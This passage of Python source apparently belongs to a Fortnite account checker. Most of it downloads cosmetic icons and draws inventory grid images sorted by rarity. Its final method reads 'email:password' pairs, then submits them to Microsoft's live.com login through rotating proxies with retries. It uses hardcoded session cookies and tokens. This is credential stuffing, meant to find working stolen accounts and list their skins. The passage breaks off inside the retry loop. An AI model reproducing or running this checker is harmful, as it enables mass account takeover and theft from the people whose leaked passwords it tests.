        "MARVEL SERIES": os.path.join(current_dir, "cuadrados", "marvel.png"),
        "DC SERIES": os.path.join(current_dir, "cuadrados", "dc.png"),
        "Gaming Legends Series": os.path.join(current_dir, "cuadrados", "serie.png"),
        "Shadow Series": os.path.join(current_dir, "cuadrados", "shadow.png"),
        "Slurp Series": os.path.join(current_dir, "cuadrados", "slurp.png"),
        "Lava Series": os.path.join(current_dir, "cuadrados", "lava.png"),
        "Frozen Series": os.path.join(current_dir, "cuadrados", "hielo.png")
    }

    rarity_priority = {
        "Mythic": 1,
        "Legendary": 2,
        "Epic": 13,
        "Rare": 14,
        "Uncommon": 15,
        "Common": 16,
        "Icon Series": 11,
        "DARK SERIES": 3,
        "Star Wars Series": 5,
        "MARVEL SERIES": 6,
        "DC SERIES": 12,
        "Gaming Legends Series": 9,
        "Shadow Series": 10,
        "Slurp Series": 4,
        "Lava Series": 7,
        "Frozen Series": 8
    }

    mythic_ids = [
        "cid_657_athena_commando_f_techopsblue", "cid_a_101_athena_commando_m_tacticalwoodlandblue","character_snowsoldierfashion", "cid_020_athena_commando_m","cid_017_athena_commando_m", "cid_028_athena_commando_f", "cid_029_athena_commando_f_halloween", 
        "cid_032_athena_commando_m_medieval", "cid_033_athena_commando_f_medieval", "cid_035_athena_commando_m_medieval", "cid_a_256_athena_commando_f_uproarbraids_8iozw",
        "cid_052_athena_commando_f_psblue", "cid_095_athena_commando_m_founder", "cid_096_athena_commando_f_founder",
        "cid_113_athena_commando_m_blueace", "cid_114_athena_commando_f_tacticalwoodland", "cid_175_athena_commando_m_celestial",
        "cid_174_athena_commando_f_carbidewhite", "cid_183_athena_commando_m_modernmilitaryred", "cid_207_athena_commando_m_footballdudea",
        "cid_208_athena_commando_m_footballdudeb", "cid_209_athena_commando_m_footballdudec", "cid_210_athena_commando_f_footballgirla", "cid_030_athena_commando_m_halloween",
        "cid_211_athena_commando_f_footballgirlb", "cid_212_athena_commando_f_footballgirlc", "cid_238_athena_commando_f_footballgirld", 
        "cid_239_athena_commando_m_footballduded", "cid_240_athena_commando_f_plague", "cid_313_athena_commando_m_kpopfashion",
        "cid_342_athena_commando_m_streetracermetallic", "cid_434_athena_commando_f_stealthhonor", "cid_441_athena_commando_f_cyberscavengerblue", "cid_479_athena_commando_f_davinci",
        "cid_478_athena_commando_f_worldcup", "cid_515_athena_commando_m_barbequelarry", "cid_516_athena_commando_m_blackwidowrogue", "cid_657_athena_commando_f_techOpsBlue",
        "cid_619_athena_commando_f_techllama", "cid_660_athena_commando_f_bandageninjablue", "cid_703_athena_commando_m_cyclone", "cid_084_athena_commando_m_assassin", "cid_083_athena_commando_f_tactical",
        "cid_761_athena_commando_m_cyclonespace", "cid_783_athena_commando_m_aquajacket", "cid_964_athena_commando_m_historian_869bc", "cid_084_athena_commando_m_assassin", "cid_039_athena_commando_f_disco",
        "cid_116_athena_commando_m_carbideblack", "eid_ashtonboardwalk", "eid_ashtonsaltlake", "eid_bendy", "eid_bollywood", "eid_chicken", "cid_757_athena_commando_f_wildcat", 
        "eid_crackshotclock", "eid_dab", "eid_fireworksspin", "eid_fresh", "eid_griddles", "eid_hiphop01", "eid_iceking", "eid_kpopdance03",
        "eid_macaroon_45lhe", "eid_ridethepony_athena", "eid_robot", "eid_rockguitar", "eid_solartheory", "eid_taketheL", "eid_tapshuffle", "cid_386_athena_commando_m_streetopsstealth", "cid_371_athena_commando_m_speedymidnight",
        "eid_torchsnuffer", "eid_trophycelebrationfncs", "eid_trophycelebration", "eid_twistdaytona", "eid_zest_q1k5v", "founderumbrella",
        "founderglider", "glider_id_001", "glider_id_002_medieval", "glider_id_003_district", "glider_id_004_disco", "glider_id_014_dragon",
        "glider_id_090_celestial", "glider_id_176_blackmondaycape_4p79k", "glider_id_206_donut", "umbrella_snowflake", "glider_warthog",
        "glider_voyager", "bid_001_bluesquire", "bid_002_royaleknight", "bid_004_blackknight", "bid_005_raptor", "bid_025_tactical", "eid_electroshuffle",
        "bid_024_space", "bid_027_scavenger", "bid_029_retrogrey", "bid_030_tacticalrogue", "bid_055_psburnout", "bid_072_vikingmale",
        "bid_103_clawed", "bid_102_buckles", "bid_138_celestial", "bid_468_cyclone", "bid_520_cycloneuniverse", "halloweenscythe",
        "pickaxe_id_013_teslacoil", "pickaxe_id_015_holidaycandycane", "pickaxe_id_021_megalodon", "pickaxe_id_019_heart",
        "pickaxe_id_029_assassin", "pickaxe_id_077_carbidewhite", "pickaxe_id_088_psburnout", "pickaxe_id_116_celestial",
        "pickaxe_id_294_candycane", "pickaxe_id_359_cyclonemale", "pickaxe_id_376_fncs", "pickaxe_id_508_historianmale_6bqsw", "pickaxe_id_011_medieval", "eid_takethel", "eid_floss",
        "pickaxe_id_804_fncss20male", "pickaxe_id_stw007_basic", "pickaxe_lockjaw", "cid_416_athena_commando_m_assassinsuit", "cid_089_athena_commando_m_retrogrey", "cid_085_athena_commando_m_twitch",
        "cid_360_athena_commando_m_techopsblue", "cid_296_athena_commando_m_math", "cid_315_athena_commando_m_teriyakifish","cid_747_athena_commando_m_badegg",
        "cid_a_196_athena_commando_f_fncsgreen", "cid_138_athena_commando_m_psburnout", "cid_711_athena_commando_m_longshorts", "character_retrowheels",
        "cid_a_024_athena_commando_f_skirmish_qw2bq", "cid_a_161_athena_commando_m_quarrel_slxqg", "cid_a_162_athena_commando_f_quarrel_e5d63", "cid_a_023_athena_commando_m_skirmish_w1n7h",
        "character_masterkeyorder", "cid_a_106_athena_commando_f_futurepinkgoal", "cid_a_410_athena_commando_m_maskeddancer_fncs", 
    ]

    def get_cache_key(self, *args, **kwargs) -> str:
        combined = "_".join(str(arg) for arg in args)
        combined += "_" + "_".join(f"{k}_{v}" for k, v in kwargs.items())
        return self.sanitize_filename(combined)

    def save_cache(self, key: str, data: dict) -> None:
        cache_path = f'./caches/{key}.pkl'
        try:
            with open(cache_path, 'wb') as f:
                pickle.dump(data, f)
        except Exception as e:
            print(f"Failed to save cache: {e}")

    def load_cache(self, key: str) -> dict:
        cache_path = f'./caches/{key}.pkl'
        try:
            with open(cache_path, 'rb') as f:
                return pickle.load(f)
        except FileNotFoundError:
            return None
        except pickle.UnpicklingError:
            print(f"Failed to load cache from {cache_path}. File may be corrupted.")
            return None
        except Exception as e:
            print(f"Error loading cache: {e}")
            return None

    def sanitize_filename(self, filename: str) -> str:
        return re.sub(r'[<>:"/\\|?*\x00-\x1F]', '_', filename)
    
    def save_cache_async(self, cache_key, result):
        threading.Thread(target=self.save_cache, args=(cache_key, result)).start()

    @lru_cache(maxsize=128)
    def get_cosmetic_info(self, cosmetic_id: str) -> dict:
        cache_key = self.get_cache_key(cosmetic_id)
        cached_data = self.load_cache(cache_key)
        if cached_data:
            return cached_data

        try:
            response = requests.get(f"https://fortnite-api.com/v2/cosmetics/br/{cosmetic_id}", timeout=Checker.timeout)
            if response.status_code != 200:
                return {"id": cosmetic_id, "rarity": "Common", "name": "Unknown", "styles": []}
            data = response.json()
            rarity = data.get("data", {}).get("rarity", {}).get("displayValue", "Common")
            name = data.get("data", {}).get("name", "Unknown")
            styles = data.get("data", {}).get("variants", [])
            if cosmetic_id.lower() in self.mythic_ids:
                rarity = "Mythic"
            if name == "Unknown":
                name = cosmetic_id
            result = {"id": cosmetic_id, "rarity": rarity, "name": name, "styles": styles}

            self.save_cache_async(cache_key, result)

            return result
        except Exception as e:
            print(f"An error occurred: {str(e)}")
            return {"id": cosmetic_id, "rarity": "Common", "name": "Unknown", "styles": []}


    def _download_image(self, id):
        try:
            imgpath = f"./cache/{id}.png"
            if not os.path.exists(imgpath) or not os.path.isfile(imgpath) or os.path.getsize(imgpath) == 0:
                urls = [
                    f"https://fortnite-api.com/images/cosmetics/br/{id}/icon.png",
                    f"https://fortnite-api.com/images/cosmetics/br/{id}/smallicon.png"
                ]
                for url in urls:
                    response = requests.get(url)
                    if response.status_code == 200:
                        with open(imgpath, "wb") as f:
                            f.write(response.content)
                        break
                else:
                    with open(imgpath, "wb") as f:
                        f.write(open("tbd.png", "rb").read())
                        
        except Exception as e:
            print(f"An error occurred: {str(e)}")
            print("Traceback:")
            print(traceback.format_exc())

            # Optionally, log the error to a file for later review
            with open('error_log.txt', 'a', encoding='utf8') as f:
                f.write(f"Error in processing items: {str(e)}\n")
                f.write("Traceback:\n")
                f.write(traceback.format_exc() + "\n")

    
    def download_cosmetic_images(self, ids):
        try:
            with ThreadPoolExecutor(max_workers=Checker.threads) as executor:
                executor.map(self._download_image, ids)
        except Exception as e:
            # Print the error message to the console with traceback
            print(f"An error occurred: {str(e)}")
            print("Traceback:")
            print(traceback.format_exc())

            # Optionally, log the error to a file for later review
            with open('error_log.txt', 'a', encoding='utf8') as f:
                f.write(f"Error in processing items: {str(e)}\n")
                f.write("Traceback:\n")
                f.write(traceback.format_exc() + "\n")
            
            
    def _dl_variant(self, variant_url: str, variant_path: str):
        try:
            response = requests.get(variant_url)
            if response.status_code == 200:
                with open(variant_path, "wb") as f:
                    f.write(response.content)
        except Exception as e:
            # Print the error message to the console with traceback
            print(f"An error occurred: {str(e)}")
            print("Traceback:")
            print(traceback.format_exc())

            # Optionally, log the error to a file for later review
            with open('error_log.txt', 'a', encoding='utf8') as f:
                f.write(f"Error in processing items: {str(e)}\n")
                f.write("Traceback:\n")
                f.write(traceback.format_exc() + "\n")

    def combine_with_background(self, foreground: Image.Image, background: Image.Image, name: str, rarity: str, variantid: str = None) -> Image.Image:
        key = self.get_cache_key(name, rarity, variantid)
        cached_image = self.load_cache(key)
        if cached_image:
            return Image.open(io.BytesIO(cached_image))


        if foreground is None or background is None:
            print("Foreground or background image is None.")
            return None
        
        try:
            bg = background.convert("RGBA")
            fg = foreground.convert("RGBA")
            fg = fg.resize(bg.size, Image.Resampling.LANCZOS)
            bg.paste(fg, (0, 0), fg)

            draw = ImageDraw.Draw(bg)
            special_rarities = {
                "Icon Series", "DARK SERIES", "Star Wars Series","Gaming Legends Series", "MARVEL SERIES", "DC SERIES", 
                "Shadow Series", "Slurp Series", "Lava Series", "Frozen Series"
            }
            max_font_size = 50
            if rarity in special_rarities:
                max_font_size *= 2

            min_font_size = 10
            max_text_width = bg.width - 20
            font_size = max_font_size

            while font_size > min_font_size:
                font = ImageFont.truetype(self.FONT_PATH, size=font_size)
                text_bbox = draw.textbbox((0, 0), name, font=font)
                text_width, text_height = text_bbox[2] - text_bbox[0], text_bbox[3] - text_bbox[1]

                if text_width <= max_text_width:
                    break

                font_size -= 1

            font = ImageFont.truetype(self.FONT_PATH, size=font_size)
            text_bbox = draw.textbbox((0, 0), name, font=font)
            text_width, text_height = text_bbox[2] - text_bbox[0], text_bbox[3] - text_bbox[1]
            text_x = (bg.width - text_width) // 2

            muro_y_position = int(bg.height * 0.80)
            muro_height = bg.height - muro_y_position

            muro = Image.new('RGBA', (bg.width, muro_height), (0, 0, 0, int(255 * 0.7)))
            bg.paste(muro, (0, muro_y_position), muro)

            text_y = muro_y_position + (muro_height - text_height) // 2
            draw.text((text_x, text_y), name, fill="white", font=font)

            output = io.BytesIO()
            bg.save(output, format='PNG')
            cached_data = output.getvalue()
            self.save_cache_async(key, cached_data)

            return Image.open(io.BytesIO(cached_data))
        except Exception as e:
            print(f"An error occurred: {str(e)}")
            print("Traceback:")
            print(traceback.format_exc())
            with open('error_log.txt', 'a', encoding='utf8') as f:
                f.write(f"Error in processing items: {str(e)}\n")
                f.write("Traceback:\n")
                f.write(traceback.format_exc() + "\n")
            return None


    def process_image(self, idx, image, max_cols, image_size, spacing):
        col = idx % max_cols
        row = idx // max_cols
        position = (col * (image_size + spacing), row * (image_size + spacing))
        resized_image = image.resize((image_size, image_size))
        return (position, resized_image)

    def combine_images(self, images, item_count: int, logo_filename="logo.png"):
        try:
            max_width = 1848
            max_height = 2048

            num_items = len(images)
            base_max_cols = 6
            max_cols = base_max_cols
            num_rows = math.ceil(num_items / max_cols)

            while num_rows > max_cols:
                max_cols += 1
                num_rows = math.ceil(num_items / max_cols)
            
            while num_rows > max_cols:
                max_cols += 1
                num_rows += 1

            item_width = max_width // max_cols
            item_height = max_height // num_rows
            image_size = min(item_width, item_height)
            spacing = 0  

            total_width = max_cols * image_size + (max_cols - 1) * spacing
            total_height = num_rows * image_size + (num_rows - 1) * spacing

            empty_space_height = image_size
            total_height += empty_space_height

            combined_image = Image.new("RGBA", (total_width, total_height), (0, 0, 0, 255))

            with ThreadPoolExecutor(max_workers=25) as executor:
                futures = [executor.submit(self.process_image, idx, img, max_cols, image_size, spacing) for idx, img in enumerate(images)]
                for future in as_completed(futures):
                    position, resized_image = future.result()
                    combined_image.paste(resized_image, position, resized_image)

            logo = Image.open(logo_filename).convert("RGBA")
            logo_height = int(empty_space_height * 0.6)
            logo_width = int((logo_height / logo.height) * logo.width)
            logo_position = (10, total_height - empty_space_height + (empty_space_height - logo_height) // 2)

            logo = logo.resize((logo_width, logo_height))
            combined_image.paste(logo, logo_position, logo)

            text1 = f"{('Total Cosmetics')}: {item_count}"
            text2 = f""
            text3 = ("Son Fortnite Checker")
            max_text_width = total_width - (logo_position[0] + logo_width + 10)
            font_size = logo_height // 3

            font = ImageFont.truetype(self.FONT_PATH, size=font_size)
            text_bbox1 = font.getbbox(text1)
            text_bbox2 = font.getbbox(text2)
            text_bbox3 = font.getbbox(text3)
            text_width1, text_height1 = text_bbox1[2] - text_bbox1[0], text_bbox1[3] - text_bbox1[1]
            text_width2, text_height2 = text_bbox2[2] - text_bbox2[0], text_bbox2[3] - text_bbox2[1]
            text_width3, text_height3 = text_bbox3[2] - text_bbox3[0], text_bbox3[3] - text_bbox3[1]

            while (text_width1 > max_text_width or text_width2 > max_text_width or text_width3 > max_text_width) and font_size > 8:
                font_size -= 1
                font = ImageFont.truetype(self.FONT_PATH, size=font_size)
                text_bbox1 = font.getbbox(text1)
                text_bbox2 = font.getbbox(text2)
                text_bbox3 = font.getbbox(text3)
                text_width1, text_height1 = text_bbox1[2] - text_bbox1[0], text_bbox1[3] - text_bbox1[1]
                text_width2, text_height2 = text_bbox2[2] - text_bbox2[0], text_bbox2[3] - text_bbox2[1]
                text_width3, text_height3 = text_bbox3[2] - text_bbox3[0], text_bbox3[3] - text_bbox3[1]

            text_x1 = logo_position[0] + logo_width + 10
            text_y1 = logo_position[1] + (logo_height - text_height1 - text_height2 - text_height3) // 2
            text_x2 = text_x1
            text_y2 = text_y1 + text_height1 + 5
            text_x3 = text_x1
            text_y3 = text_y2 + text_height2 + 5

            draw = ImageDraw.Draw(combined_image)
            draw.text((text_x1, text_y1), text1, fill="white", font=font)
            draw.text((text_x2, text_y2), text2, fill="white", font=font)
            draw.text((text_x3, text_y3), text3, fill="white", font=font)

            return combined_image
        except Exception as e:
            print(f"An error occurred: {str(e)}")
            print("Traceback:")
            print(traceback.format_exc())

            with open('error_log.txt', 'a', encoding='utf8') as f:
                f.write(f"Error in processing items: {str(e)}\n")
                f.write("Traceback:\n")
                f.write(traceback.format_exc() + "\n")


    def createimg(self, ids: list, title: str = None, sort_by_rarity: bool = True, item_order: list = None, unlocked_styles: dict = None) -> io.BytesIO:
        try:
            if not os.path.exists('./cache'):
                os.makedirs('./cache')

            self.download_cosmetic_images(ids)
            images = []
            info_list = []

            with concurrent.futures.ThreadPoolExecutor(max_workers=15) as executor:
                cosmetic_info_list = list(executor.map(self.get_cosmetic_info, ids))
                futures = []
                for id, info in zip(ids, cosmetic_info_list):
                    futures.append(executor.submit(self._process_image, id, info, unlocked_styles))

                for future in concurrent.futures.as_completed(futures):
                    result = future.result()
                    if result:
                        images.extend(result['images'])
                        info_list.extend(result['info_list'])

            if images:
                combined_list = list(zip(info_list, images))

                if item_order and sort_by_rarity:
                    ordered_list = sorted(
                        combined_list,
                        key=lambda x: item_order.index(self.get_cosmetic_type(x[0]["id"])) if self.get_cosmetic_type(x[0]["id"]) in item_order else 999
                    )


                    def group_key(item):
                        return item_order.index(self.get_cosmetic_type(item[0]["id"])) if self.get_cosmetic_type(item[0]["id"]) in item_order else 999

                    grouped = groupby(ordered_list, key=group_key)
                    
                    sorted_images = []
                    for _, group in grouped:
                        sorted_group = sorted(group, key=lambda x: self.rarity_priority.get(x[0]["rarity"], 6))
                        sorted_images.extend(img for _, img in sorted_group)

                elif sort_by_rarity:
                    sorted_images = sorted(
                        combined_list,
                        key=lambda x: self.rarity_priority.get(x[0]["rarity"], 6)
                    )
                    sorted_images = [img for _, img in sorted_images]

                elif item_order:
                    sorted_images = sorted(
                        combined_list,
                        key=lambda x: item_order.index(self.get_cosmetic_type(x[0]["id"])) if self.get_cosmetic_type(x[0]["id"]) in item_order else 999
                    )
                    sorted_images = [img for _, img in sorted_images]

                else:
                    sorted_images = images

                combined_image = self.combine_images(sorted_images, len(ids))
                f = io.BytesIO()
                combined_image.save(f, "PNG")
                f.seek(0)
                return f
            else:
                return None
        except Exception as e:
            print(f"An error occurred: {str(e)}")
            with open('error_log.txt', 'a', encoding='utf8') as f:
                f.write(f"Error in processing items: {str(e)}\n")

    def _process_image(self, id, info, unlocked_styles):
        images = []
        info_list = []
        imgpath = f"./cache/{id}.png"
        try:
            img = Image.open(imgpath)
            if img.size == (1, 1):
                raise IOError("Image is empty")
            info_list.append(info)
            background_path = self.rarity_backgrounds.get(info["rarity"], self.rarity_backgrounds["Common"])
            background = Image.open(background_path)
            img = self.combine_with_background(img, background, info["name"], info["rarity"])
            images.append(img)
            if unlocked_styles and id in unlocked_styles:
                for variant in info["styles"]:
                    for option in variant["options"]:
                        if option["tag"] in unlocked_styles[id]:
                            variant_id = f"{id}_{option['tag']}"
                            variant_path = f"./cache/{variant_id}.png"
                            with ThreadPoolExecutor(max_workers=15) as variant_executor:
                                variant_executor.submit(self._dl_variant, option["image"], variant_path)
                            variant_img = Image.open(variant_path)
                            variant_background = Image.open(background_path)
                            variant_img = self.combine_with_background(variant_img, variant_background, f"{info['name']} ({option['name']})", info["rarity"])
                            images.append(variant_img)
        except (IOError, OSError, UnidentifiedImageError) as e:
            print("Error opening image")
        return {"images": images, "info_list": info_list}

    def sort_ids_by_rarity(self, ids: list) -> list:
        try:
            cosmetic_info_list = [self.get_cosmetic_info(id) for id in ids]
            sorted_ids = [id for _, id in sorted(zip(cosmetic_info_list, ids), key=lambda x: self.rarity_priority.get(x[0]["rarity"], 6))]
            return sorted_ids
        except Exception as e:
            print(f"An error occurred: {str(e)}")
            print("Traceback:")
            print(traceback.format_exc())

            with open('error_log.txt', 'a', encoding='utf8') as f:
                f.write(f"Error in processing items: {str(e)}\n")
                f.write("Traceback:\n")
                f.write(traceback.format_exc() + "\n")

    def createimg_per_group(self, groups: dict) -> dict:
        try:
            images = {}
            for group, ids in groups.items():
                sorted_ids = self.sort_ids_by_rarity(ids)
                image_data = self.createimg(sorted_ids, " " , sort_by_rarity=True)
                images[group] = io.BytesIO(image_data)
            return images
        except Exception as e:
            print(f"An error occurred: {str(e)}")
            print("Traceback:")
            print(traceback.format_exc())

            with open('error_log.txt', 'a', encoding='utf8') as f:
                f.write(f"Error in processing items: {str(e)}\n")
                f.write("Traceback:\n")
                f.write(traceback.format_exc() + "\n")

    def filter_mythic_ids(self, items):
        try:
            mythic_items = []
            for item_type, ids in items.items():
                for id in ids:
                    if id.lower() in self.mythic_ids:
                        mythic_items.append(id)
            return mythic_items
        except Exception as e:
            print(f"An error occurred: {str(e)}")
            print("Traceback:")
            print(traceback.format_exc())

            with open('error_log.txt', 'a', encoding='utf8') as f:
                f.write(f"Error in processing items: {str(e)}\n")
                f.write("Traceback:\n")
                f.write(traceback.format_exc() + "\n")
                
    def get_cosmetic_type(self, cosmetic_id):
        if "character_" in cosmetic_id or "cid" in cosmetic_id:
            return "Skins"
        elif "bid_" in cosmetic_id or "backpack" in cosmetic_id:
            return "Backpacks"
        elif "pickaxe_" in cosmetic_id or "pickaxe_id_" in cosmetic_id or "DefaultPickaxe" in cosmetic_id or "HalloweenScythe" in cosmetic_id or "HappyPickaxe" in cosmetic_id or "SickleBatPickaxe" in cosmetic_id or "SkiIcePickaxe" in cosmetic_id or "SpikyPickaxe" in cosmetic_id:
            return "Pickaxes"
        elif "eid" in cosmetic_id or "emote" in cosmetic_id:
            return "Emotes"
        elif "glider" in cosmetic_id or "founderumbrella" in cosmetic_id or "founderglider" in cosmetic_id:
            return "Gliders"
        elif "wrap" in cosmetic_id:
            return "Wraps"
        elif "spray" in cosmetic_id:
            return "Sprays"
        else:
            return "Others"

    def usecheck(self, line):

        try:
            if line.count(':') == 1:
                checked_num = 0
                email, password = line.split(':')
                while True:
                    if checked_num != Checker.retries:
                            session = requests.sessions.session()
                            scraper = cloudscraper.create_scraper()
                            url = 'https://login.live.com/ppsecure/post.srf?client_id=82023151-c27d-4fb5-8551-10c10724a55e&contextid=A31E247040285505&opid=F7304AA192830107&bk=1701944501&uaid=a7afddfca5ea44a8a2ee1bba76040b3c&pid=15216'
                                   
                            headers = {
                                    "Accept-Encoding": "gzip, deflate, br",
                                    "Accept-Language": "en,en-US;q=0.9,en;q=0.8",
                                    "Cache-Control": "max-age=0",
                                    "Connection": "keep-alive",
                                    "Content-Length": "814",
                                    "Content-Type": "application/x-www-form-urlencoded",
                                    "Cookie": "MicrosoftApplicationsTelemetryDeviceId=920e613f-effa-4c29-8f33-9b639c3b321b; MSFPC=GUID=1760ade1dcf744b88cec3dccf0c07f0d&HASH=1760&LV=202311&V=4&LU=1701108908489; mkt=ar-SA; IgnoreCAW=1; MUID=251A1E31369E6D281AED0DE737986C36; MSCC=197.33.70.230-EG; MSPBack=0; NAP=V=1.9&E=1cca&C=sD-vxVi5jYeyeMkwVA7dKII2IAq8pRAa4DmVKHoqD1M-tyafuCSd4w&W=2; ANON=A=D086BC080C843D7172138ECBFFFFFFFF&E=1d24&W=2; SDIDC=CVbyEkUg8GuRPdWN!EPGwsoa25DdTij5DNeTOr4FqnHvLfbt1MrJg5xnnJzsh!HecLu5ZypjM!sZ5TtKN5sdEd2rZ9rugezwzlcUIDU5Szgq7yMLIVdfna8dg3sFCj!kQaXy2pwx6TFwJ7ar63EdVIz*Z3I3yVzEpbDMlVRweAFmG1M54fOyH0tdFaXs5Mk*7WyS05cUa*oiyMjqGmeFcnE7wutZ2INRl6ESPNMi8l98WUFK3*IKKZgUCfuaNm8lWfbBzoWBy9F3hgwe9*QM1yi41O*rE0U0!V4SpmrIPRSGT5yKcYSEDu7TJOO1XXctcPAq21yk*MnNVrYYfibqZvnzRMvTwoNBPBKzrM6*EKQd6RKQyJrKVdEAnErMFjh*JKgS35YauzHTacSRH6ocroAYtB0eXehx5rdp2UyG5kTnd8UqA00JYvp4r1lKkX4Tv9yUb3tZ5vR7JTQLhoQpSblC4zSaT9R5AgxKW3coeXxqkz0Lbpz!7l9qEjO*SdOm*5LBfF2NZSLeXlhol**kM3DFdLVyFogVq0gl0wR52Y02; MSPPre=imrozza%40outlook.com%7c8297dd0d702a14b0%7c%7c; MSPCID=8297dd0d702a14b0; MSPSoftVis=@:@; MSPRequ=id=N&lt=1701944501&co=0; uaid=a7afddfca5ea44a8a2ee1bba76040b3c; OParams=11O.DmVQflQtPeQAtoyExD*hjGXsJOLcnQHVlRoIaEDQfzrgMX2Lpzfa992qCQeIn0O8kdrgRfMm1kEmcXgJqSTERtHj0vlp9lkdMHHCEwZiLEOtxzmks55h!6RupAnHQKeVfVEKbzcTLMei4RMeW1drXQ0BepPQN*WgCK3ua!f6htixcJYNtwumc8f29KYtizlqh0lqQ3a2dZ4Kd!KDOneLTE512ScqObfQd5AGBu*xLbcRbg6xqh1eWCOXW!JOT6defiMqxBGPNL1kQUYgc5WAG8tmjMPFLqVn1*f4xws1NDhwmYOHPu!rS9dn*trC71knxMAfi5Tt69XZHdojgnuopBag*YM7uIBrhUyfxjR*4Zkyygfax9gMaxxG9KScOnPvemNY1ZfVH9Vm!IxQFKoPoKBdLVH5Jc7Eokycow31oq7vNcAbi!cS3Wby0LjzBdr8jq2Aqj3RlWfckJaRoReZ4nY34Gh*eVllAMrF*VQP1iQ7t*I28266q6OQGZ9Y1q53Ai72b!8H5wjQJIJw1XV4zwRO8J02gt6vIPpLBFiq!7IkawEubBPpynkQ3neDo92Tpc71Y*WrnD6H8ojgzxRAj!DIiyfyA7kJHJ7DU!XSg*Xo0L1!DRYSBV!PKwNM7MaBiqsKbRWFnFyzKhBACfiPe8dK5ZUGBSpFbUlpXkUJOb247ewTWAsl9D4G6mezVjGY1u9uOYUPc3ZqTEBFRf4TK94CllbiMRC0v26W*qlwOl0SSpBufo8MtOUqvowUFqEWDDVl9WFV5bT2zZVUy4kPj9a*3YNnskgZghnOCtQYKIIRdFTWgL*DcbQ4XRL8hMisBDjyniS16W2P!1FH0dT12w7RlsJCdotQSK1WppX8sGWNrPrYNcih5ErXVZtYKbqrZLw2EcyGmkp7NxBHFUQXx*1tZSEeiWoZ5BrHSiEB7X2gB7BQDP7RbVYZS5UXeNp3rlGdN*5!nUGK3Fltm1sKFmtZU!T1Q0WaeFwVvpFYSCxg9uw6CC!va2dB*R6NFK!3GNBDrCvbXnJMaKVb!UoBP5G*GASdPnuJgb3cjUE*DIYMJRrPT!dZoHd5BAQSF3vBoPZasphWeflxXFMPBi055OBEawIzxOqS6Wn3IZCp3dgk8QLNssATkzwZvpUM5lSq710QTMZWENDKp5gTIlWcdYpKG1d8TmRlqXRJN7bdUuRIoehIWqnfSuJxGoNk6PM3x3!gMaxPxe1Ch6hMmsagHM8fFQ!MpP0TQ9nsIxh1goCaL*PbHDyj1U3btyu2RXibwIwgV1h5A6DgwmgbaH1Hn9LpdLipiT5fGiRbI903!wYUA3MgQg98OH9BQaJPXte1YpL8iUjUA9MreaZTQ5P13cUiNYrkTW2jVr5PTpEJvwpg*8piWEo9k*IzOCr6iKMRiZwTft*QYEEaKxbyvgLG*s33uhCN46R9J1VwPufzsxyGUHYyE5S1mhx8sWxw!pndIQ!RgVEsDfzvOO0H2P1hBGQG8npJ18th2WKYrvouqHZfRBcEc77hsbXUKec2lv4ETHag0RdrT6kFn03RDX*p*Hac*nugVJK1j0GouxkITbOmMjb8cpau*Lf*xNBUFc3roCuPjEpAcR48X51rIGpOjhAe56Q6CbwIuVe*z*KmRptzngkT4!AB*FGGKh2lOi6b0qR1w4Aia2g1pfjJU2G1r*Q!kSNxYtGn0WOkHiVkhAXQCvkNFp3q!ivZs3obM!0ffg$$; ai_session=6FvJma4ss/5jbM3ZARR4JM|1701943445431|1701944504493; MSPOK=$uuid-d9559e5d-eb3c-4862-aefb-702fdaaf8c62$uuid-d48f3872-ff6f-457e-acde-969d16a38c95$uuid-c227e203-c0b0-411f-9e65-01165bcbc281$uuid-98f882b7-0037-4de4-8f58-c8db795010f1$uuid-0454a175-8868-4a70-9822-8e509836a4ef$uuid-ce4db8a3-c655-4677-a457-c0b7ff81a02f$uuid-160e65e0-7703-4950-9154-67fd0829b36",
                                    "Host": "login.live.com",
                                    "Origin": "https://login.live.com",
                                    "Referer": "https://login.live.com/oauth20_authorize.srf?client_id=82023151-c27d-4fb5-8551-10c10724a55e&redirect_uri=https%3A%2F%2Faccounts.epicgames.com%2FOAuthAuthorized&state=eyJpZCI6IjAzZDZhYmM1NDIzMjQ2Yjg5MWNhYmM2ODg0ZGNmMGMzIn0%3D&scope=xboxlive.signin&service_entity=undefined&force_verify=true&response_type=code&display=popup",
                                    "Sec-Fetch-Dest": "document",
                                    "Sec-Fetch-Mode": "navigate",
                                    "Sec-Fetch-Site": "same-origin",
                                    "Sec-Fetch-User": "?1",
                                    "Upgrade-Insecure-Requests": "1",
                                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
                                    "sec-ch-ua": "\"Not_A Brand\";v=\"99\", \"Google Chrome\";v=\"109\", \"Chromium\";v=\"109\"",
                                    "sec-ch-ua-mobile": "?0",
                                    "sec-ch-ua-platform": "\"Windows\""
                            }
                            payload = {
                                "i13": "0",
                                "login": email,
                                "loginfmt": email,
                                "type": "11",
                                "LoginOptions": "3",
                                "lrt": "",
                                "lrtPartition": "",
                                "hisRegion": "",
                                "hisScaleUnit": "",
                                "passwd": password,
                                "ps": "2",
                                "psRNGCDefaultType": "1",
                                "psRNGCEntropy": "",
                                "psRNGCSLK": "-DiygW3nqox0vvJ7dW44rE5gtFMCs15qempbazLM7SFt8rqzFPYiz07lngjQhCSJAvR432cnbv6uaSwnrXQ*RzFyhsGXlLUErzLrdZpblzzJQawycvgHoIN2D6CUMD9qwoIgR*vIcvH3ARmKp1m44JQ6VmC6jLndxQadyaLe8Tb!ZLz59Te6lw6PshEEM54ry8FL2VM6aH5HPUv94uacHz!qunRagNYaNJax7vItu5KjQ",
                                "canary": "",
                                "ctx": "",
                                "hpgrequestid": "",
                                "PPFT": "-DjzN1eKq4VUaibJxOt7gxnW7oAY0R7jEm4DZ2KO3NyQh!VlvUxESE5N3*8O*fHxztUSA7UxqAc*jZ*hb9kvQ2F!iENLKBr0YC3T7a5RxFF7xUXJ7SyhDPND0W3rT1l7jl3pbUIO5v1LpacgUeHVyIRaVxaGUg*bQJSGeVs10gpBZx3SPwGatPXcPCofS!R7P0Q$$",
                                "PPSX": "Passp",
                                "NewUser": "1",
                                "FoundMSAs": "",
                                "fspost": "0",
                                "i21": "0",
                                "CookieDisclosure": "0",
                                "IsFidoSupported": "1",
                                "isSignupPost": "0",
                                "isRecoveryAttemptPost": "0",
                                "i19": "21648"
                            }
                            while True:
                                try:
                                    response = session.post(url, headers=headers, data=payload, proxies=self.proxies(), timeout=Checker.timeout)
                                    if 'Too Many Requests' in response.text:
                                        Counter.retries+=1
                                        continue
                                    else:
                                        break
                                except Exception as e:
                                    Counter.retries+=1
                                    continue
